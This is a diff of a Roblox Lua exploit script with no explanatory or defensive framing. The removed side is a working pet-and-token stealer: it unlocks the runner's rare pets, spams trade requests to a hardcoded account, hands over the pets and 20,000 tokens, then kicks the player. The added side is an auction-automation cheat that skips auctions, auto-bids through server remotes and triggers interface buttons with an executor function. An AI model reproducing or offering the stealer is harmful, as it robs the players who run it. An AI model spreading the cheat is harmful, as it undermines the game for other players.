@@ -1,221 +1,184 @@
-local targetUsername = "Ebikeu"
-local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot", "Grand Ice Wizard"}
-local tokenAmount = 20000  -- Starting token amount
-
--- SERVICES
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
-local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
-local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)
+local LocalPlayer = Players.LocalPlayer
 
--- VARIABLES
-local player = Players.LocalPlayer
+local AuctionsFolder = workspace:WaitForChild("Debris"):WaitForChild("Auctions")
+local ItemsModule = require(ReplicatedStorage.Modules.Items)
 
--- FUNCTIONS
-function WaitForCondition(conditionFunc, timeout)
-    local startTime = tick()
-    while not conditionFunc() do
-        if tick() - startTime > (timeout or 30) then
-            return false
-        end
-        task.wait()
-    end
-    return true
+local Auctions = ReplicatedStorage:WaitForChild("Events"):WaitForChild("Auctions")
+local EnterQueue = Auctions:WaitForChild("EnterQueue")
+local Skip = Auctions:WaitForChild("Skip")
+local SkipCountdown = Auctions:WaitForChild("SkipCountdown")
+local UpdateCurrentBid = Auctions:WaitForChild("UpdateCurrentBid")
+local PlaceBid = Auctions:WaitForChild("PlaceBid")
+
+local Events = ReplicatedStorage:WaitForChild("Events")
+local DataEvent = Events:WaitForChild("Data"):WaitForChild("GetAll")
+
+local TARGET_NAME = "valentine"
+local TARGET_ID = "Valentine Safe"
+
+local currentNextBid
+local currentBidder
+local inAuction = false
+local foundTargetInAuction = false
+local obtainedTarget = false
+local halted = false
+
+UpdateCurrentBid.OnClientEvent:Connect(function(data)
+	if not data then return end
+	currentNextBid = data.nextBid
+	currentBidder = data.player
+end)
+
+AuctionsFolder.ChildAdded:Connect(function()
+	inAuction = true
+end)
+
+AuctionsFolder.ChildRemoved:Connect(function()
+	if #AuctionsFolder:GetChildren() == 0 then
+		inAuction = false
+		foundTargetInAuction = false
+	end
+end)
+
+local function storageFull()
+	local success, data = pcall(function()
+		return DataEvent:InvokeServer()
+	end)
+	if not success or not data then
+		return false
+	end
+	local inv = data.Inventory or {}
+	local carryLevel = data.CarryLevel
+	local invLevel = data.InventoryLevel
+	local RepLibrary = require(ReplicatedStorage.Modules.RepLibrary)
+	local carrySpace = RepLibrary:GetCarrySpace(LocalPlayer, carryLevel)
+	local invSpace = RepLibrary:GetInventorySpace(LocalPlayer, invLevel)
+	local invCount = RepLibrary:GetLengthOfInventory(inv)
+	if invCount >= invSpace or carrySpace <= 0 then
+		return true
+	end
+	return false
 end
 
-function UnlockPets()
-    local PetNames = {}
-    for _, name in ipairs(petsToTrade) do
-        PetNames[name] = true
-    end
-    
-    local pets = Replication.Data and Replication.Data.Pets
-    if not pets then return end
-    
-    for _, petData in pairs(pets) do
-        if petData
-            and petData.Name
-            and PetNames[petData.Name]
-            and (petData.Locked == true or petData.Locked == 1 or petData.Locked == "true")
-        then
-            Network:InvokeServer("LockPet", petData.Id, false)
-        end
-    end
+local function clickButton(obj)
+	if obj and (obj:IsA("TextButton") or obj:IsA("ImageButton")) then
+		pcall(function() obj:Activate() end)
+		if getconnections then
+			for _, c in pairs(getconnections(obj.MouseButton1Click)) do
+				pcall(function() c:Fire() end)
+			end
+		end
+	end
 end
 
-function GetPetIDsByName()
-    local petIDs = {}
-    local pets = Replication.Data and Replication.Data.Pets
-    if not pets then return petIDs end
-    
-    local petNameLookup = {}
-    for _, name in ipairs(petsToTrade) do
-        petNameLookup[name] = true
-    end
-    
-    for _, petData in pairs(pets) do
-        if petData and petData.Name and petNameLookup[petData.Name] then
-            table.insert(petIDs, petData.Id)
-        end
-    end
-    
-    return petIDs
+local function handleItemsWon()
+	local gui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("ItemsWon", true)
+	if not gui then return end
+
+	local itemsFrame = gui:FindFirstChild("ItemsFrame", true)
+	local noItems = gui:FindFirstChild("NoItems", true)
+
+	if itemsFrame and itemsFrame.Visible then
+		local frame = itemsFrame:FindFirstChild("Frame")
+		if frame then
+			local selected = {}
+			for _, child in pairs(frame:GetChildren()) do
+				if child:IsA("ImageButton") and child:FindFirstChild("Price") then
+					local price = tonumber(child.Price.Text:match("%d+")) or 0
+					local isTarget = false
+					local itemId = child.Name
+					local itemData = ItemsModule[itemId]
+					if itemData and itemData.Name and string.find(string.lower(itemData.Name), TARGET_NAME) then
+						isTarget = true
+					end
+					if isTarget then
+						clickButton(child)
+						obtainedTarget = true
+					else
+						table.insert(selected, child)
+					end
+				end
+			end
+			for _, btn in pairs(selected) do
+				clickButton(btn)
+			end
+			local confirm = itemsFrame:FindFirstChild("ConfirmButton", true)
+			clickButton(confirm)
+		end
+	end
+
+	if noItems and noItems.Visible then
+		local btn = noItems:FindFirstChild("Button", true)
+		clickButton(btn)
+	end
 end
 
-function HasPetsToTrade()
-    local petIDs = GetPetIDsByName()
-    return #petIDs > 0
-end
+task.spawn(function()
+	while not halted and not obtainedTarget do
+		if storageFull() then
+			print("Storage full. Script halted.")
+			halted = true
+			break
+		end
 
-function FindTargetPlayer()
-    return Players:FindFirstChild(targetUsername)
-end
+		pcall(function()
+			EnterQueue:InvokeServer("1")
+		end)
 
-function WaitForPetsRemoved(tradedPetIDs)
-    local startTime = tick()
-    
-    while tick() - startTime < 3 do
-        local currentPetIDs = GetPetIDsByName()
-        
-        local allRemoved = true
-        for _, tradedId in ipairs(tradedPetIDs) do
-            local stillHas = false
-            for _, currentId in ipairs(currentPetIDs) do
-                if currentId == tradedId then
-                    stillHas = true
-                    break
-                end
-            end
-            if stillHas then
-                allRemoved = false
-                break
-            end
-        end
-        
-        if allRemoved then
-            return true
-        end
-        
-        task.wait(0.1)
-    end
-    
-    return false
-end
+		repeat task.wait(0.5) until inAuction or halted
+		if halted then break end
 
-function GetTokenAmount()
-    return tokenAmount
-end
+		while inAuction and not foundTargetInAuction and not halted do
+			for _, garage in ipairs(AuctionsFolder:GetChildren()) do
+				local itemsFolder = garage:FindFirstChild("Items")
+				local hasTarget = false
+				if itemsFolder then
+					for _, itemInstance in pairs(itemsFolder:GetChildren()) do
+						local itemData = ItemsModule[itemInstance.Name]
+						if itemData and itemData.Name and string.find(string.lower(itemData.Name), TARGET_NAME) then
+							hasTarget = true
+							foundTargetInAuction = true
+							break
+						end
+					end
+				end
+				if not hasTarget then
+					pcall(function() SkipCountdown:InvokeServer() end)
+					task.wait(0.05)
+					pcall(function() Skip:InvokeServer() end)
+				end
+				if foundTargetInAuction then break end
+			end
+			task.wait(0.3)
+		end
 
-function AddTokensToTrade()
-    while GetTokenAmount() > 0 do
-        local target = FindTargetPlayer()
-        if not target then
-            return
-        end
-        
-        -- Send trade request
-        Network:FireServer("SendTrade", target)
-        
-        -- Wait until the trade window is open
-        while not player.PlayerGui.Trading.Enabled do
-            task.wait(1)
-        end
+		repeat task.wait(0.5) until not inAuction or halted
+	end
+end)
 
-        -- Add tokens to the trade
-        local confirmed
-        while type(confirmed) ~= "number" do
-            confirmed = Network:InvokeServer("UpdateTradeTokens1", false, GetTokenAmount())
-            task.wait()
-        end
-        
-        -- Ready up after adding tokens
-        Network:FireServer("ReadyUp", false, true)
-        
-        task.wait(5)  -- Wait for 5 seconds before checking again
-        task.wait(3)  -- Additional wait for any final trade actions
-    end
-end
+task.spawn(function()
+	while not halted and not obtainedTarget do
+		task.wait(0.2)
+		if inAuction and foundTargetInAuction and currentNextBid and currentBidder ~= LocalPlayer then
+			pcall(function()
+				PlaceBid:InvokeServer(currentNextBid)
+			end)
+		end
+	end
+end)
 
-function TradeWithTarget()
-    while true do
-        if not HasPetsToTrade() then
-            print("No pets to trade! Kicking...")
-            player:Kick("No more pets to trade")
-            return
-        end
-        
-        -- Ensure UnlockPets happens after checking pets
-        UnlockPets()
+LocalPlayer:WaitForChild("PlayerGui").DescendantAdded:Connect(function(obj)
+	if obj.Name == "ItemsWon" or obj.Name == "Button" then
+		task.wait()
+		handleItemsWon()
+	end
+end)
 
-        local target = FindTargetPlayer()
-        if not target then
-            task.wait(5)
-            return
-        end
-        
-        -- Spam trade request every second until the trade window opens
-        while not player.PlayerGui.Trading.Enabled do
-            Network:FireServer("SendTrade", target)
-            task.wait(1)
-        end
-        
-        -- Once in trade, keep adding pets to the trade
-        local petIDs = GetPetIDsByName()
-        if #petIDs > 0 then
-            for _, petId in ipairs(petIDs) do
-                Network:InvokeServer("AddTradeItem", { "Pet", petId })
-            end
-            
-            -- Ready up and keep adding pets until trade is completed
-            Network:FireServer("ReadyUp", false, true)
-            
-            -- Wait for pets to disappear and trade to finish
-            local tradeCompleted = WaitForPetsRemoved(petIDs)
-            if tradeCompleted then
-                print("Trade completed. Waiting 30 seconds...")
-                task.wait(30) -- Wait for 30 seconds after trade completion
-                
-                -- After 30 seconds, check for remaining pets
-                local checkStart = tick()
-                while tick() - checkStart < 5 do
-                    if not HasPetsToTrade() then
-                        print("No pets left. Kicking player...")
-                        player:Kick("Trade complete")
-                        return
-                    end
-                    task.wait(0.1)
-                end
-
-                -- If still have pets, continue to next iteration
-                if HasPetsToTrade() then
-                    print("Still have pets left. Re-entering trade.")
-                    task.wait(1)
-                end
-            else
-                print("Trade did not complete in time.")
-                return
-            end
-        end
-        
-        -- If still have pets to trade, continue trading
-        if HasPetsToTrade() then
-            print("Re-entering trade with remaining pets")
-            task.wait(1)
-        else
-            print("No more pets left to trade.")
-            break
-        end
-    end
-end
-
--- MAIN LOGIC
-while true do
-    if not HasPetsToTrade() then
-        player:Kick("No more pets to trade")
-        break
-    end
-    
-    print("Starting trade process.")
-    TradeWithTarget()
-    AddTokensToTrade()  -- Add tokens to the trade after pets are done
-    task.wait(1)
-end
+task.spawn(function()
+	while not halted and not obtainedTarget do
+		task.wait(0.5)
+		handleItemsWon()
+	end
+end)
